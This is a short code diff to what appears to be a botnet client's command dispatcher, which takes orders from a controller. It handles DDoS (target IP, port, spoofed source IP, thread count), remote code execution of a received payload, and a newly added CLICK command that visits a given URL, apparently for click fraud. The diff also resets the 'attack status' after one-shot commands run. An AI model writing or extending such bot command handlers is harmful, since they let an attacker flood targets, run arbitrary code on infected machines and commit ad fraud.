@@ -1,3 +1,4 @@
+from commands.click import CommandClick
 from commands.rce import CommandRCE
 from commands.ddos import CommandDDoS
 from commands.command import Command, CommandType
@@ -59,10 +60,15 @@ def on_command(data):
         command = CommandDDoS(data['target_ip'], data['target_port'], data['fake_ip'], data['nb_threads'])
     elif data['type'] == CommandType.RCE:
         command = CommandRCE(data['payload'])
+    elif data['type'] == CommandType.CLICK:
+        command = CommandClick(data['url'])
 
     if command is not None:
         running_command = command
         running_command.process()
+        if running_command.is_atomic:
+            # Reset attack status after execution
+            running_command = None
     else:
         print('Error, command {} does not exists'.format(data['type']))
 
